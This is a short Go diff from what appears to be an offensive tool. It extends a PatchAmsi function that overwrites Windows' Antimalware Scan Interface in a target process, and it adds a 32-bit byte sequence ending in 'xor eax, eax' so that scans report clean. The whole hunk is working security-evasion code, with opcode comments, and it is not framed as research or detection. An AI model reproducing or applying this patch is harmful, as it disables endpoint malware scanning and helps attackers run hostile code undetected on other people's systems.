@@ -33,7 +33,17 @@ func PatchAmsi(pid int) error {
 
 	// Payload to inject into the function
 	// xor rax, rax
+	// bytes for 64bit process
 	newBytes := []byte{0x48, 0x31, 0xC0}
+
+	// xor eax, eax
+	// 33 C0
+	// kept the first few instructions before the je instruction
+	// bytes for 32bit process
+	if IsWOW64Process() {
+		newBytes = []byte{0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x8B, 0x4D, 0x0C, 0x33, 0xC0}
+	}
+
 	lbytes := uintptr(len(newBytes))
 
 	// Write the payload
